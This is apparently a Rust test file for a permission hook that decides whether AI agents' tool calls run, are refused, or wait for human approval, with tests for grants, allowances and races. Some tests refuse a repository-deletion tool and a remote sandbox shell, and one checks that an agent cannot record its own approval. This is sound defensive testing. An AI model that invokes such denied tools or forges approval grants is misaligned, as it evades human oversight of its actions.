            &daemon,
            search,
            &json!({ "url": "https://api.github.com/search/issues?q=bug" }),
        );
        assert!(allowed.allow, "{allowed:?}");
        let called = daemon.events(EventKind::ToolCalled);
        let EventBody::ToolCalled(body) = &called.last().expect("recorded").body else {
            panic!("a tool.called body");
        };
        assert_eq!(body.tool, search);
        assert_eq!(body.server.as_deref().map(String::as_str), Some("github"));
        assert_eq!(body.tag, Some(ConnectorTagWire::Network));

        denied_for(
            &github_call(&daemon, "mcp__github__delete_repo", &json!({})),
            "tool_denied",
        );
        denied_for(
            &github_call(&daemon, "mcp__github__merge_pull", &json!({})),
            "tool_not_tagged",
        );
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_custom_connector_does_not_let_webfetch_through() {
        let daemon = TestDaemon::new("hook-custom-webfetch", |_| {});
        with_github(&daemon);
        for tool in ["WebFetch", "WebSearch"] {
            let decision = github_call(&daemon, tool, &json!({ "url": "https://example.com/" }));
            denied_for(&decision, "tier_not_granted");
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_session_about_no_task_is_refused_without_asking() {
        let daemon = TestDaemon::new("hook-external-no-task", |_| {});
        with_github(&daemon);
        daemon
            .state
            .sessions()
            .get_mut("session-github")
            .expect("registered")
            .registration
            .task_id = None;

        let decision = create_issue(&daemon, "session-github", &json!({ "title": "x" }));

        denied_for(&decision, "external_effect_refused");
        assert!(
            daemon.events(EventKind::ToolApprovalRequested).is_empty(),
            "nothing is recorded that no row lists and nothing can decide"
        );
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn an_external_effect_call_asks_with_its_whole_input() {
        let daemon = TestDaemon::new("hook-custom-external", |_| {});
        with_github(&daemon);
        // Longer than the 4 KiB a tool call's input is cut at, keys out of order.
        let input = json!({ "title": "x", "body": "b".repeat(5_000) });
        let approval = asked(&daemon, "session-github", &input);
        assert_eq!(
            last_denied_server(&daemon).as_deref(),
            Some("github"),
            "recorded against its server"
        );
        let requested = daemon.events(EventKind::ToolApprovalRequested);
        assert_eq!(requested.len(), 1);
        let ids = &requested[0].envelope.ids;
        assert_eq!(ids.agent_id.as_deref(), Some("dev-a"));
        assert_eq!(ids.session_id.as_deref(), Some("session-github"));
        assert_eq!(
            ids.task_id.as_ref().map(|id| id.to_string()).as_deref(),
            Some("FRK-1")
        );
        let EventBody::ToolApprovalRequested(body) = &requested[0].body else {
            panic!("a tool_approval.requested body");
        };
        assert_eq!(body.server.as_str(), "github");
        assert_eq!(body.tool.as_str(), "create_issue");
        assert_eq!(body.input, input.to_string(), "whole, never cut");
        assert_eq!(
            body.input_sha256.as_str(),
            farik_core::governor::permissions::input_sha256(&input)
        );
        assert_eq!(
            daemon.state.stop_reason("session-github"),
            Some(format!("approval_needed: approval {approval}")),
            "the session is stopped"
        );
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_large_input_is_refused_not_asked() {
        let daemon = TestDaemon::new("hook-custom-large", |_| {});
        with_github(&daemon);
        let large = json!({ "body": "b".repeat(64 * 1024) });
        let decision = create_issue(&daemon, "session-github", &large);
        assert_eq!(
            decision.reason,
            "tool_input_too_large: create_issue's input is over 64 KiB, too long to show you, so \
             it is refused"
        );
        assert!(!decision.allow);
        assert!(daemon.events(EventKind::ToolApprovalRequested).is_empty());
        assert_eq!(daemon.events(EventKind::ToolDenied).len(), 1);
        assert_eq!(daemon.state.stop_reason("session-github"), None);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_preauthorized_external_tool_still_asks() {
        let daemon = TestDaemon::new("hook-custom-preauthorized", |_| {});
        daemon
            .project
            .deps
            .files
            .write_team(&a_team_of_three(|wire| {
                wire["agents"][1]["preauthorized_external_tools"] =
                    json!(["mcp__github__create_issue"]);
            }))
            .expect("the team is written");
        with_github(&daemon);
        asked(&daemon, "session-github", &json!({}));
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_designers_call_before_the_plan_is_refused_not_asked() {
        let daemon = TestDaemon::new("hook-custom-designer", |_| {});
        daemon
            .project
            .deps
            .files
            .write_team(&a_team_of_three(with_the_designer))
            .expect("the team is written");
        github_session(&daemon, "session-iris", "iris");
        let decision = create_issue(&daemon, "session-iris", &json!({ "title": "x" }));
        denied_for(&decision, "design_plan_not_approved");
        assert!(daemon.events(EventKind::ToolApprovalRequested).is_empty());
        assert_eq!(daemon.state.stop_reason("session-iris"), None);
        // Once the plan is approved, it asks.
        daemon.project.record(
            "FRK-1",
            "design_plan.proposed",
            &json!({ "plan": "A plan." }),
        );
        daemon.project.record(
            "FRK-1",
            "design_plan.approved",
            &json!({ "reason": "Go ahead." }),
        );
        asked(&daemon, "session-iris", &json!({ "title": "x" }));
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn approve_then_the_same_call_runs_once() {
        let daemon = TestDaemon::new("hook-grant-once", |_| {});
        with_github(&daemon);
        let input = json!({ "title": "x", "labels": ["bug"] });
        let approval = asked(&daemon, "session-github", &input);
        grant(&daemon, approval);
        github_session(&daemon, "session-next", "dev-a");
        // The same input, its keys in another order.
        let reordered: Value =
            serde_json::from_str(r#"{"labels":["bug"],"title":"x"}"#).expect("JSON");
        let allowed = create_issue(&daemon, "session-next", &reordered);
        assert!(allowed.allow, "{allowed:?}");
        assert_eq!(used(&daemon), Some(approval));
        let again = asked(&daemon, "session-next", &input);
        assert!(again > approval);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_grant_is_used_once_under_concurrency() {
        // A clock that sleeps in every append puts a check-then-write race inside its window.
        let daemon = TestDaemon::new("hook-grant-concurrent", |_| {})
            .slowed(std::time::Duration::from_millis(50));
        with_github(&daemon);
        let input = json!({ "title": "x" });
        let approval = asked(&daemon, "session-github", &input);
        grant(&daemon, approval);
        github_session(&daemon, "session-next", "dev-a");
        let request = daemon.call("session-next", "mcp__github__create_issue", &input);
        let barrier = std::sync::Barrier::new(2);
        let decisions: Vec<HookDecision> = std::thread::scope(|scope| {
            let calls: Vec<_> = (0..2)
                .map(|_| {
                    scope.spawn(|| {
                        barrier.wait();
                        decide_pre_tool_use(&request, &daemon.state)
                    })
                })
                .collect();
            calls
                .into_iter()
                .map(|call| call.join().expect("the call ends"))
                .collect()
        });
        assert_eq!(
            decisions.iter().filter(|decision| decision.allow).count(),
            1,
            "{decisions:?}"
        );
        assert_eq!(daemon.events(EventKind::ToolCalled).len(), 1);
    }

    /// `dev-a`'s `session-github`, allowed `calls` of `create_issue` each period unasked.
    fn allowing_github(daemon: &TestDaemon, calls: u32) {
        allowing_session(daemon, "session-github", "dev-a", "FRK-1", Some(calls));
    }

    /// The `allowance` the last `tool.called` ran inside.
    fn ran_inside(daemon: &TestDaemon) -> Option<u32> {
        let called = daemon.events(EventKind::ToolCalled);
        let EventBody::ToolCalled(body) = &called.last().expect("recorded").body else {
            panic!("a tool.called body");
        };
        body.allowance
            .map(|calls| u32::try_from(calls.get()).expect("at most 1000"))
    }

    /// `dev-a`'s `create_issue` through `session-github`, with an input of its own each time.
    fn issue(daemon: &TestDaemon, n: u32) -> HookDecision {
        create_issue(daemon, "session-github", &json!({ "title": n }))
    }

    /// A `tool.called` of `agent` for `tool` of `server`, recorded at `when`, as the hook would.
    fn called_at(
        daemon: &TestDaemon,
        agent: &str,
        server: &str,
        tool: &str,
        when: chrono::DateTime<chrono::Utc>,
    ) {
        daemon.project.record_by(
            Some(agent),
            when,
            "FRK-1",
            "tool.called",
            &json!({ "tool": tool, "input": "{}", "server": server, "tag": "external_effect" }),
        );
    }

    /// `session`, of `kai` on FRK-1, given `server` as the kit wrote it for the agent, and its
    /// `session.started` recorded.
    fn kai_session(daemon: &TestDaemon, session: &str, server: &farik_core::team::CustomServer) {
        use farik_core::governor::permissions::{PermissionTier, SessionConnector};

        use crate::daemon::SessionRegistration;
        use crate::session::SessionPurpose;

        daemon.state.register_session(SessionRegistration {
            session_id: session.to_string(),
            agent_id: "kai".to_string(),
            task_id: Some("FRK-1".parse().expect("a task id")),
            purpose: SessionPurpose::Implement,
            in_reply_to: None,
            thread: None,
            skills: Vec::new(),
            skills_root: None,
            cwd: daemon.worktree.clone(),
            executor: None,
            limits: DEFAULT_SESSION_LIMITS,
            farik_tools: Vec::new(),
            tiers: vec![PermissionTier::Read],
            connectors: vec![SessionConnector {
                server: server.name.clone(),
                origin: None,
                tools: server.tools.clone(),
                allowances: server.allowances.clone(),
                plan_tools: std::collections::BTreeSet::new(),
            }],
            preview: None,
        });
        task_event(
            daemon,
            "FRK-1",
            session,
            "kai",
            "session.started",
            &json!({ "purpose": "implement", "model": "claude-sonnet-5-5", "effort": "medium" }),
        );
    }

    /// A guard, not RED: the shipped entry is committed before this test. Proves, on the entry the
    /// kit writes, that a tool the kit never offers is refused, that twenty images run unasked,
    /// that the twenty-first and a batch ask. An ask stops the session, so the order is the plan's.
    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn higgsfields_images_run_inside_their_allowance_then_ask() {
        use std::collections::BTreeMap;

        use farik_core::contract::Role;
        use farik_core::team::fixtures::an_agent_wire;
        use farik_protocol::event::ConnectorTagWire;

        let daemon = TestDaemon::new("hook-higgsfield-allowance", |_| {});
        let team = a_team_of_three(|wire| {
            wire["agents"]
                .as_array_mut()
                .expect("a list of agents")
                .push(an_agent_wire("kai", "marketing_specialist"));
        });
        daemon
            .project
            .deps
            .files
            .write_team(&team)
            .expect("the team is written");
        let kit = farik_roles::load_kit(Role::MarketingSpecialist)
            .expect("the Marketing Specialist's kit");
        let (_, server) =
            crate::daemon::team::kit_entry(&kit, &team, "kai", "higgsfield", &BTreeMap::new())
                .expect("the kit's entry for kai");
        kai_session(&daemon, "session-kai", &server);
        let hook = |session: &str, tool: &str, input: &Value| {
            decide_pre_tool_use(&daemon.call(session, tool, input), &daemon.state)
        };

        // A shell on Higgsfield's machine is never offered.
        let refused = hook("session-kai", "mcp__higgsfield__sandbox_exec", &json!({}));
        denied_for(&refused, "tool_denied");
        let denied = daemon.events(EventKind::ToolDenied);
        assert_eq!(denied.len(), 1);
        let EventBody::ToolDenied(body) = &denied[0].body else {
            panic!("a tool.denied body");
        };
        assert_eq!(
            body.server.as_deref().map(String::as_str),
            Some("higgsfield")
        );
        assert_eq!(body.tag, Some(ConnectorTagWire::Denied));
        assert!(daemon.events(EventKind::ToolCalled).is_empty());
        assert_eq!(daemon.state.stop_reason("session-kai"), None);

        // Twenty images run inside the allowance, each with an input of its own.
        for n in 1..=20 {
            let allowed = hook(
                "session-kai",
                "mcp__higgsfield__generate_image",
                &json!({ "prompt": format!("a banner, take {n}"), "count": 1 }),
            );
            assert!(allowed.allow, "{n}: {allowed:?}");
            assert_eq!(ran_inside(&daemon), Some(20), "{n}");
        }
        assert!(daemon.events(EventKind::ToolApprovalRequested).is_empty());

        // The twenty-first asks, and the ask stops the session.
        let asked = hook(
            "session-kai",
            "mcp__higgsfield__generate_image",
            &json!({ "prompt": "a banner, take 21", "count": 1 }),
        );
        denied_for(&asked, "approval_needed");
        assert_eq!(daemon.events(EventKind::ToolApprovalRequested).len(), 1);
        assert_eq!(daemon.events(EventKind::ToolCalled).len(), 20);
        assert!(daemon.state.stop_reason("session-kai").is_some());

        // A batch asks whatever the count: it has no allowance. A second session, since the first
        // one stopped.
        kai_session(&daemon, "session-kai-next", &server);
        let batch = hook(
            "session-kai-next",
            "mcp__higgsfield__generate_image_batch",
            &json!({ "prompts": ["a banner"] }),
        );
        denied_for(&batch, "approval_needed");
        assert_eq!(daemon.events(EventKind::ToolApprovalRequested).len(), 2);
        assert_eq!(daemon.events(EventKind::ToolCalled).len(), 20);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn runs_a_call_inside_its_allowance_without_asking() {
        let daemon = TestDaemon::new("hook-allowance-inside", |_| {});
        allowing_github(&daemon, 2);
        for n in 1..=2 {
            let allowed = issue(&daemon, n);
            assert!(allowed.allow, "{n}: {allowed:?}");
            assert_eq!(ran_inside(&daemon), Some(2), "{n}");
        }
        assert!(daemon.events(EventKind::ToolApprovalRequested).is_empty());
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn asks_for_the_first_call_beyond_it() {
        let daemon = TestDaemon::new("hook-allowance-beyond", |_| {});
        allowing_github(&daemon, 2);
        assert!(issue(&daemon, 1).allow);
        assert!(issue(&daemon, 2).allow);
        denied_for(&issue(&daemon, 3), "approval_needed");
        assert_eq!(daemon.events(EventKind::ToolApprovalRequested).len(), 1);
        assert_eq!(daemon.events(EventKind::ToolCalled).len(), 2);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn counts_per_agent_and_per_tool() {
        let daemon = TestDaemon::new("hook-allowance-per", |_| {});
        allowing_github(&daemon, 2);
        // Another agent's calls of the tool, and this agent's of another, are not its count.
        for _ in 0..2 {
            called_at(
                &daemon,
                "dev-b",
                "github",
                "mcp__github__create_issue",
                at(),
            );
            called_at(&daemon, "dev-a", "github", "mcp__github__close_issue", at());
        }
        assert!(issue(&daemon, 1).allow);
        assert!(issue(&daemon, 2).allow);
        denied_for(&issue(&daemon, 3), "approval_needed");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn resets_with_the_sprint() {
        let daemon = TestDaemon::new("hook-allowance-sprint", |_| {});
        allowing_github(&daemon, 2);
        assert!(issue(&daemon, 1).allow);
        assert!(issue(&daemon, 2).allow);
        denied_for(&issue(&daemon, 3), "approval_needed");
        // The calls before the sprint started are not its.
        daemon.project.open_sprint("S1", None, &[]);
        // The ask stopped that session; the agent's next one makes its calls.
        allowing_session(&daemon, "session-next", "dev-a", "FRK-1", Some(2));
        let next = |n: u32| create_issue(&daemon, "session-next", &json!({ "title": n }));
        assert!(next(4).allow);
        assert!(next(5).allow);
        denied_for(&next(6), "approval_needed");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn counts_per_utc_day_with_no_sprint_open() {
        use chrono::{TimeZone, Utc};

        let daemon = TestDaemon::new("hook-allowance-day", |_| {});
        allowing_github(&daemon, 2);
        let yesterday = Utc
            .with_ymd_and_hms(2026, 9, 21, 23, 59, 0)
            .single()
            .expect("a time");
        let today = Utc
            .with_ymd_and_hms(2026, 9, 22, 0, 1, 0)
            .single()
            .expect("a time");
        called_at(
            &daemon,
            "dev-a",
            "github",
            "mcp__github__create_issue",
            yesterday,
        );
        called_at(
            &daemon,
            "dev-a",
            "github",
            "mcp__github__create_issue",
            today,
        );
        assert!(
            issue(&daemon, 1).allow,
            "yesterday's call does not count, today's does"
        );
        denied_for(&issue(&daemon, 2), "approval_needed");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn counts_from_the_sprints_end_on_the_day_it_ended() {
        use chrono::{TimeZone, Utc};

        let at_hour = |hour| {
            Utc.with_ymd_and_hms(2026, 9, 22, hour, 0, 0)
                .single()
                .expect("a time")
        };
        let daemon = TestDaemon::new("hook-allowance-ended", |_| {}).on_the_clock(at_hour(17));
        allowing_github(&daemon, 2);
        daemon.project.record_at(
            at_hour(8),
            "",
            "sprint.started",
            &json!({ "sprint_id": "S1", "budget_usd": null, "started_by": "human" }),
        );
        called_at(
            &daemon,
            "dev-a",
            "github",
            "mcp__github__create_issue",
            at_hour(9),
        );
        called_at(
            &daemon,
            "dev-a",
            "github",
            "mcp__github__create_issue",
            at_hour(10),
        );
        daemon.project.record_at(
            at_hour(15),
            "",
            "sprint.ended",
            &json!({ "sprint_id": "S1", "ended_by": "human", "left": [] }),
        );
        called_at(
            &daemon,
            "dev-a",
            "github",
            "mcp__github__create_issue",
            at_hour(16),
        );
        assert!(
            issue(&daemon, 1).allow,
            "the sprint's two calls are not today's"
        );
        denied_for(&issue(&daemon, 2), "approval_needed");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_restart_reads_the_count_from_the_log() {
        let daemon = TestDaemon::new("hook-allowance-restart", |_| {});
        allowing_github(&daemon, 2);
        assert!(issue(&daemon, 1).allow);
        assert!(issue(&daemon, 2).allow);
        // A daemon started afresh over the same log.
        let restarted = std::sync::Arc::new(crate::daemon::DaemonState::new(
            std::sync::Arc::clone(&daemon.project.deps),
        ));
        let again = TestDaemon {
            state: restarted,
            ..daemon
        };
        allowing_github(&again, 2);
        denied_for(&issue(&again, 3), "approval_needed");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn counts_by_server_and_full_tool_name() {
        let daemon = TestDaemon::new("hook-allowance-server", |_| {});
        allowing_github(&daemon, 2);
        // gitlab's tool of the same bare name, and a bare name that is no connector's.
        for _ in 0..2 {
            called_at(
                &daemon,
                "dev-a",
                "gitlab",
                "mcp__gitlab__create_issue",
                at(),
            );
            called_at(&daemon, "dev-a", "github", "create_issue", at());
        }
        assert!(issue(&daemon, 1).allow);
        assert!(issue(&daemon, 2).allow);
        denied_for(&issue(&daemon, 3), "approval_needed");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn counts_a_call_a_grant_allowed() {
        let daemon = TestDaemon::new("hook-allowance-grant", |_| {});
        allowing_github(&daemon, 2);
        assert!(issue(&daemon, 1).allow);
        assert!(issue(&daemon, 2).allow);
        // Beyond it, the human allows one more, which is made and counted too.
        let asked_for = json!({ "title": 3 });
        let approval = asked(&daemon, "session-github", &asked_for);
        grant(&daemon, approval);
        allowing_session(&daemon, "session-next", "dev-a", "FRK-1", Some(3));
        let allowed = create_issue(&daemon, "session-next", &asked_for);
        assert!(allowed.allow, "{allowed:?}");
        assert_eq!(used(&daemon), Some(approval));
        // Three calls made: the allowance of 3 is spent, so a fourth asks.
        asked(&daemon, "session-next", &json!({ "title": 4 }));
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn lets_one_of_two_calls_at_the_last_place_run() {
        let daemon = TestDaemon::new("hook-allowance-race", |_| {})
            .slowed(std::time::Duration::from_millis(50));
        allowing_github(&daemon, 2);
        assert!(issue(&daemon, 1).allow);
        let (first, second) = (
            daemon.call(
                "session-github",
                "mcp__github__create_issue",
                &json!({ "title": "a" }),
            ),
            daemon.call(
                "session-github",
                "mcp__github__create_issue",
                &json!({ "title": "b" }),
            ),
        );
        let barrier = std::sync::Barrier::new(2);
        let decisions: Vec<HookDecision> = std::thread::scope(|scope| {
            let calls: Vec<_> = [&first, &second]
                .into_iter()
                .map(|request| {
                    scope.spawn(|| {
                        barrier.wait();
                        decide_pre_tool_use(request, &daemon.state)
                    })
                })
                .collect();
            calls
                .into_iter()
                .map(|call| call.join().expect("the call ends"))
                .collect()
        });
        assert_eq!(
            decisions.iter().filter(|decision| decision.allow).count(),
            1,
            "{decisions:?}"
        );
        assert_eq!(daemon.events(EventKind::ToolCalled).len(), 2);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_different_input_is_not_approved() {
        let daemon = TestDaemon::new("hook-grant-input", |_| {});
        with_github(&daemon);
        let approval = asked(&daemon, "session-github", &json!({ "title": "x", "n": 1 }));
        grant(&daemon, approval);
        github_session(&daemon, "session-next", "dev-a");
        asked(&daemon, "session-next", &json!({ "title": "x", "n": 2 }));
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_grant_is_for_the_asking_agent_only() {
        let daemon = TestDaemon::new("hook-grant-agent", |_| {});
        with_github(&daemon);
        // A session of dev-a's started before the grant is not its next session.
        github_session(&daemon, "session-earlier", "dev-a");
        let input = json!({ "title": "x" });
        let approval = asked(&daemon, "session-github", &input);
        grant(&daemon, approval);
        asked(&daemon, "session-earlier", &input);
        github_session(&daemon, "session-dev-b", "dev-b");
        asked(&daemon, "session-dev-b", &input);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_grant_is_for_its_task_server_and_tool_only() {
        let daemon = TestDaemon::new("hook-grant-key", |_| {});
        daemon
            .project
            .filed_with("FRK-2", "in_progress", "task", None, |wire| {
                wire["assignee"] = json!("dev-a");
            });
        with_github(&daemon);
        let input = json!({ "title": "x" });
        let approval = asked(&daemon, "session-github", &input);
        grant(&daemon, approval);
        task_session(&daemon, "session-frk-2", "dev-a", "FRK-2");
        denied_for(
            &create_issue(&daemon, "session-frk-2", &input),
            "approval_needed",
        );
        for (session, tool) in [
            ("session-close", "mcp__github__close_issue"),
            ("session-gitlab", "mcp__gitlab__create_issue"),
        ] {
            github_session(&daemon, session, "dev-a");
            let decision = decide_pre_tool_use(&daemon.call(session, tool, &input), &daemon.state);
            denied_for(&decision, "approval_needed");
        }
        // The grant is still there for the call it was given for.
        github_session(&daemon, "session-next", "dev-a");
        let allowed = create_issue(&daemon, "session-next", &input);
        assert!(allowed.allow, "{allowed:?}");
        assert_eq!(used(&daemon), Some(approval));
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_grant_lapses_with_the_next_session() {
        let daemon = TestDaemon::new("hook-grant-lapse", |_| {});
        with_github(&daemon);
        let input = json!({ "title": "x" });
        let approval = asked(&daemon, "session-github", &input);
        grant(&daemon, approval);
        github_session(&daemon, "session-next", "dev-a");
        // A session of another agent's ending takes nothing from dev-a's grant.
        github_session(&daemon, "session-dev-b", "dev-b");
        session_event(
            &daemon,
            "session-dev-b",
            "dev-b",
            "session.ended",
            &json!({ "reason": "completed", "detail": "done" }),
        );
        session_event(
            &daemon,
            "session-next",
            "dev-a",
            "session.ended",
            &json!({ "reason": "completed", "detail": "done" }),
        );
        github_session(&daemon, "session-later", "dev-a");
        asked(&daemon, "session-later", &input);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_grant_outlives_another_agents_session() {
        let daemon = TestDaemon::new("hook-grant-other-ends", |_| {});
        with_github(&daemon);
        let input = json!({ "title": "x" });
        let approval = asked(&daemon, "session-github", &input);
        grant(&daemon, approval);
        github_session(&daemon, "session-dev-b", "dev-b");
        session_event(
            &daemon,
            "session-dev-b",
            "dev-b",
            "session.ended",
            &json!({ "reason": "completed", "detail": "done" }),
        );
        // The asking session's own end, recorded after the grant, lapses nothing either.
        session_event(
            &daemon,
            "session-github",
            "dev-a",
            "session.ended",
            &json!({ "reason": "aborted", "detail": "approval_needed" }),
        );
        github_session(&daemon, "session-next", "dev-a");
        let allowed = create_issue(&daemon, "session-next", &input);
        assert!(allowed.allow, "{allowed:?}");
        assert_eq!(used(&daemon), Some(approval));
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_grant_an_agent_recorded_is_no_grant() {
        let daemon = TestDaemon::new("hook-grant-forged", |_| {});
        with_github(&daemon);
        let input = json!({ "title": "x" });
        let approval = asked(&daemon, "session-github", &input);
        // Only a command records a decision, with no agent or session on it.
        session_event(
            &daemon,
            "session-github",
            "dev-a",
            "tool_approval.granted",
            &json!({ "approval": approval }),
        );
        github_session(&daemon, "session-next", "dev-a");
        asked(&daemon, "session-next", &input);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_refused_call_asks_again() {
        let daemon = TestDaemon::new("hook-refused", |_| {});
        with_github(&daemon);
        let input = json!({ "title": "x" });
        let approval = asked(&daemon, "session-github", &input);
        daemon.project.record(
            "FRK-1",
            "tool_approval.refused",
            &json!({ "approval": approval }),
        );
        github_session(&daemon, "session-next", "dev-a");
        asked(&daemon, "session-next", &input);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn an_unknown_mcp_server_is_still_not_in_session() {
        let daemon = TestDaemon::new("hook-custom-unknown", |_| {});
        with_github(&daemon);
        denied_for(
            &github_call(&daemon, "mcp__linear__create_issue", &json!({})),
            "connector_not_in_session",
        );
        assert_eq!(last_denied_server(&daemon).as_deref(), Some("linear"));
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn refuses_a_designer_write_before_approval() {
        let daemon = TestDaemon::new("hook-design-plan", |_| {});
        daemon
            .project
            .deps
            .files
            .write_team(&a_team_of_three(|wire| {
                with_the_designer(wire);
                wire["agents"][3]["grants"] = json!(["git_remote"]);
            }))
            .expect("the team is written");
        daemon.register(
            "session-iris",
            "iris",
            Some("FRK-1"),
            DEFAULT_SESSION_LIMITS,
        );
        let edit = json!({
            "file_path": daemon.inside("src/a.rs"), "old_string": "a", "new_string": "b"
        });
        let exec = json!({ "command": "true" });
        let hook = |tool: &str, input: &Value| {
            decide_pre_tool_use(&daemon.call("session-iris", tool, input), &daemon.state)
        };
        let context = daemon
            .state
            .tool_context("session-iris")
            .expect("the session is registered");
        let called = |tool: &str, input: Value| crate::tools::fixtures::run(&context, tool, input);
        let not_approved = |result| {
            assert!(
                matches!(&result, Err(crate::tools::ToolError::Refused { reason })
                    if reason.starts_with("design_plan_not_approved: ")),
                "{result:?}"
            );
        };

        let proposed = json!({ "plan": "A plan." });
        let returned = json!({ "reason": "Say what changes." });
        for before in [
            None,
            Some(("design_plan.proposed", &proposed)),
            Some(("design_plan.returned", &returned)),
        ] {
            if let Some((kind, body)) = before {
                daemon.project.record("FRK-1", kind, body);
            }
            denied_for(&hook("Edit", &edit), "design_plan_not_approved");
            denied_for(
                &hook("mcp__farik__farik_exec", &exec),
                "design_plan_not_approved",
            );
            denied_for(
                &hook("mcp__farik__farik_git_status", &json!({})),
                "design_plan_not_approved",
            );
            denied_for(
                &hook("mcp__farik__farik_git_push", &json!({})),
                "design_plan_not_approved",
            );
            not_approved(called("farik_exec", exec.clone()));
            not_approved(called("farik_git_status", json!({})));
            not_approved(called("farik_git_push", json!({})));
            let read = hook("Read", &json!({ "file_path": daemon.inside("src/a.rs") }));
            assert!(read.allow, "{read:?}");
        }
        // The dev's own session is not held to the Designer's plan.
        let dev = decide_pre_tool_use(&daemon.dev_call("Edit", &edit), &daemon.state);
        assert!(dev.allow, "{dev:?}");

        daemon
            .project
            .record("FRK-1", "design_plan.proposed", &proposed);
        daemon.project.record(
            "FRK-1",
            "design_plan.approved",
            &json!({ "reason": "Go ahead." }),
        );
        let approved = hook("Edit", &edit);
        assert!(approved.allow, "{approved:?}");
        let exec_approved = hook("mcp__farik__farik_exec", &exec);
        assert!(exec_approved.allow, "{exec_approved:?}");
        // Past the plan gate: the fixture's session has no sandbox to run the command in.
        assert_eq!(
            called("farik_exec", exec.clone()),
            Err(crate::tools::ToolError::Failed {
                detail: "this session has no sandbox to run a command in".to_string()
            })
        );

        // A Designer's session about no task has no plan, so its commands are held, even while a
        // task's plan is approved.
        daemon.register("session-iris-none", "iris", None, DEFAULT_SESSION_LIMITS);
        let none = |tool: &str, input: &Value| {
            decide_pre_tool_use(
                &daemon.call("session-iris-none", tool, input),
                &daemon.state,
            )
        };
        // (Its `Edit` is refused before the gate: a session with no task has no allowed paths.)
        denied_for(
            &none("mcp__farik__farik_exec", &exec),
            "design_plan_not_approved",
        );
        let no_task = daemon
            .state
            .tool_context("session-iris-none")
            .expect("the session is registered");
        not_approved(crate::tools::fixtures::run(&no_task, "farik_exec", exec));
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_past_the_tool_call_limit() {
        let daemon = TestDaemon::new("hook-limit", |_| {});
        daemon.register(
            DEV_SESSION,
            "dev-a",
            Some("FRK-1"),
            SessionLimits {
                max_tool_calls: 2,
                ..DEFAULT_SESSION_LIMITS
            },
        );
        let read = daemon.dev_call("Read", &json!({ "file_path": daemon.inside("src/a.rs") }));
        let denied = decide_pre_tool_use(&daemon.dev_call("Bash", &json!({})), &daemon.state);
        denied_for(&denied, "tool_not_allowed");
        assert_eq!(
            daemon.state.tool_calls(DEV_SESSION),
            Some(0),
            "a denied call does nothing"
        );
        for _ in 0..2 {
            assert!(decide_pre_tool_use(&read, &daemon.state).allow);
        }
        let third = decide_pre_tool_use(&read, &daemon.state);
        denied_for(&third, "tool_call_limit");
        assert_eq!(daemon.state.tool_calls(DEV_SESSION), Some(2));
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn records_a_tool_return_cut_at_four_kib() {
        let daemon = TestDaemon::new("hook-return", |_| {});
        let mut wire = daemon.recorded(POST_READ);
        wire["tool_response"]["file"]["content"] = json!("é".repeat(5_000));
        let request: HookRequest = serde_json::from_value(wire).expect("reads");
        record_post_tool_use(&request, &daemon.state).expect("recorded");
        let returned = daemon.events(EventKind::ToolReturned);
        assert_eq!(returned.len(), 1);
        let EventBody::ToolReturned(body) = &returned[0].body else {
            panic!("a tool.returned event carries a tool.returned body");
        };
        assert!(body.output.len() <= 4_096, "{}", body.output.len());
        assert!(body.output.len() > 4_000, "{}", body.output.len());
        assert!(body.output.ends_with("[cut at 4 KiB]"), "{}", body.output);
        assert_eq!(body.tool, "Read");
        assert_eq!(body.duration_ms, Some(8));
        assert_eq!(
            body.tool_use_id.as_deref(),
            Some("toolu_01AGrQNrawzN2RTTvmfBahB4")
        );
        assert_eq!(
            returned[0].envelope.ids.session_id.as_deref(),
            Some(DEV_SESSION)
        );
    }

    #[test]
    fn serialises_a_decision_as_claude_code_reads_it() {
        let shape = |decision: &str, reason: &str| -> Value {
            json!({
                "hookSpecificOutput": {
                    "hookEventName": "PreToolUse",
                    "permissionDecision": decision,
                    "permissionDecisionReason": reason
                }
            })
        };
        let deny = HookDecision {
            allow: false,
            reason: "tool_not_allowed: no".to_string(),
        };
        assert_eq!(
            serde_json::to_value(&deny).expect("serialises"),
            shape("deny", "tool_not_allowed: no")
        );
        let allow = HookDecision {
            allow: true,
            reason: "allowed".to_string(),
        };
        assert_eq!(
            serde_json::to_value(&allow).expect("serialises"),
            shape("allow", "allowed")
        );
    }
}
